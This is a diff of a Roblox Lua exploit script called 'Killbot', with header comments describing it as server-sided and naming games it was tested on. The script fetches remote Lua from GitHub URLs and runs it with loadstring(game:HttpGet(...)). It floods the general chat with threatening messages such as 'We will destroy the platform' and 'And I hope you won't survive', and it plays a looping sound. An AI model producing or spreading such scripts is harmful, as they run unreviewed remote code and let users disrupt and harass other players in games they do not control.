@@ -1,3 +1,8 @@
+-- KILLBOTS ARE TAKING OVER ROBLOX
+-- This is a server-sided script (but it doesn't work in a lot of games)
+-- Supported games I tested is Mega Run Marble Pit game and Piano Keyboard v1.1
+-- Enjoy. Made by Reserved
+
 if not game:IsLoaded() then game.Loaded:Wait() end
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/somethingsimade/CurrentAngleV4/refs/heads/main/v4.lua"))()
@@ -5,11 +10,10 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/somethingsimade/Curre
 local msgs = {
     "KILLBOT HAS JOINED THE GAME.",
     "-net",
-    "Now that you are listening,",
-    "you are not alone.",
     "Roblox is gonna die.",
     "Killbots will take over.",
-    "Goodbye. Robloxians."
+    "We will destroy the platform.",
+    "And I hope you won't survive."
 }
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -31,7 +35,7 @@ repeat
             if RBXGeneral then
                 for i = 1, 6 do
                     RBXGeneral:SendAsync(msgs[i])
-                    wait(1)
+                    wait(3)
                 end
                 
                 local sound = Instance.new("Sound")
@@ -44,7 +48,7 @@ repeat
                 sound.Parent = game:GetService("Workspace")
                 sound:Play()
                 
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/Killbot%20V2"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/gititgit1113/ReservedKillbotScript/refs/heads/main/KillbotDefault.lua"))()
                 return
             end
         end
@@ -66,4 +70,4 @@ sound.Looped = true
 sound.Parent = game:GetService("Workspace")
 sound:Play()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/Killbot%20V2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gititgit1113/ReservedKillbotScript/refs/heads/main/KillbotDefault.lua"))()
